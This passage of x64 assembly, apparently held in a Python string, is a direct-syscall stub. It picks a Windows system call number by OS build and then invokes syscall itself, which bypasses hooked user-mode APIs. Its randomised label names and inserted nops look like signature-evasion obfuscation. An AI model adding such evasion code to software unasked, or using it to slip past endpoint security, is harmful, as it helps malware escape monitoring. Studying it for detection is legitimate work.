	je  eodmammwgdehtZKC_SystemCall_6_2_XXXX
	nop
	cmp dword ptr [rax+0x11c], 3
	je  eodmammwgdehtZKC_SystemCall_6_3_XXXX
	nop
	jmp eodmammwgdehtZKC_SystemCall_Unknown
eodmammwgdehtZKC_Check_6_1_XXXX:               
	nop
	cmp word ptr [rax+0x120], 7600
	je  eodmammwgdehtZKC_SystemCall_6_1_7600
	nop
	cmp word ptr [rax+0x120], 7601
	je  eodmammwgdehtZKC_SystemCall_6_1_7601
    nop
	nop
	jmp eodmammwgdehtZKC_SystemCall_Unknown
eodmammwgdehtZKC_Check_10_0_XXXX:              
	nop
	cmp word ptr [rax+0x120], 10240
	je  eodmammwgdehtZKC_SystemCall_10_0_10240
	nop
	cmp word ptr [rax+0x120], 10586
	je  eodmammwgdehtZKC_SystemCall_10_0_10586
	nop
	cmp word ptr [rax+0x120], 14393
	je  eodmammwgdehtZKC_SystemCall_10_0_14393
	nop
	cmp word ptr [rax+0x120], 15063
	je  eodmammwgdehtZKC_SystemCall_10_0_15063
	nop
	cmp word ptr [rax+0x120], 16299
	je  eodmammwgdehtZKC_SystemCall_10_0_16299
	nop
	cmp word ptr [rax+0x120], 17134
	je  eodmammwgdehtZKC_SystemCall_10_0_17134
	nop
	cmp word ptr [rax+0x120], 17763
    nop
	je  eodmammwgdehtZKC_SystemCall_10_0_17763
	nop
	cmp word ptr [rax+0x120], 18362
	je  eodmammwgdehtZKC_SystemCall_10_0_18362
	nop
	cmp word ptr [rax+0x120], 18363
	je  eodmammwgdehtZKC_SystemCall_10_0_18363
	nop
	cmp word ptr [rax+0x120], 19041
	je  eodmammwgdehtZKC_SystemCall_10_0_19041
	nop
	cmp word ptr [rax+0x120], 19042
	je  eodmammwgdehtZKC_SystemCall_10_0_19042
	nop
	cmp word ptr [rax+0x120], 19043
	je  eodmammwgdehtZKC_SystemCall_10_0_19043
	nop
	jmp eodmammwgdehtZKC_SystemCall_Unknown
eodmammwgdehtZKC_SystemCall_6_1_7600:          
	nop
	mov eax, 0x0037
	nop
	jmp eodmammwgdehtZKC_Epilogue
eodmammwgdehtZKC_SystemCall_6_1_7601:          
	nop
	mov eax, 0x0037
	nop
	jmp eodmammwgdehtZKC_Epilogue
eodmammwgdehtZKC_SystemCall_6_2_XXXX:          
	nop
	mov eax, 0x0038
	nop
	jmp eodmammwgdehtZKC_Epilogue
eodmammwgdehtZKC_SystemCall_6_3_XXXX:          
	nop
	mov eax, 0x0039
	nop
	jmp eodmammwgdehtZKC_Epilogue
eodmammwgdehtZKC_SystemCall_10_0_10240:        
	nop
	mov eax, 0x003a
	nop
	jmp eodmammwgdehtZKC_Epilogue
eodmammwgdehtZKC_SystemCall_10_0_10586:        
	nop
	mov eax, 0x003a
	nop
	jmp eodmammwgdehtZKC_Epilogue
eodmammwgdehtZKC_SystemCall_10_0_14393:        
	nop
	mov eax, 0x003a
	nop
	jmp eodmammwgdehtZKC_Epilogue
eodmammwgdehtZKC_SystemCall_10_0_15063:        
	nop
	mov eax, 0x003a
	nop
	jmp eodmammwgdehtZKC_Epilogue
eodmammwgdehtZKC_SystemCall_10_0_16299:        
	nop
	mov eax, 0x003a
	nop
	jmp eodmammwgdehtZKC_Epilogue
eodmammwgdehtZKC_SystemCall_10_0_17134:        
	nop
	mov eax, 0x003a
	nop
	jmp eodmammwgdehtZKC_Epilogue
eodmammwgdehtZKC_SystemCall_10_0_17763:        
	nop
	mov eax, 0x003a
	nop
	jmp eodmammwgdehtZKC_Epilogue
eodmammwgdehtZKC_SystemCall_10_0_18362:        
	nop
	mov eax, 0x003a
	nop
	jmp eodmammwgdehtZKC_Epilogue
eodmammwgdehtZKC_SystemCall_10_0_18363:        
	nop
	mov eax, 0x003a
	nop
	jmp eodmammwgdehtZKC_Epilogue
eodmammwgdehtZKC_SystemCall_10_0_19041:        
	nop
	mov eax, 0x003a
	nop
	jmp eodmammwgdehtZKC_Epilogue
eodmammwgdehtZKC_SystemCall_10_0_19042:        
	nop
	mov eax, 0x003a
	nop
	jmp eodmammwgdehtZKC_Epilogue
eodmammwgdehtZKC_SystemCall_10_0_19043:        
	nop
	mov eax, 0x003a
	nop
	jmp eodmammwgdehtZKC_Epilogue
eodmammwgdehtZKC_SystemCall_Unknown:           
	ret
eodmammwgdehtZKC_Epilogue:
	nop
	mov r10, rcx
    nop
	syscall
    nop
	ret
    """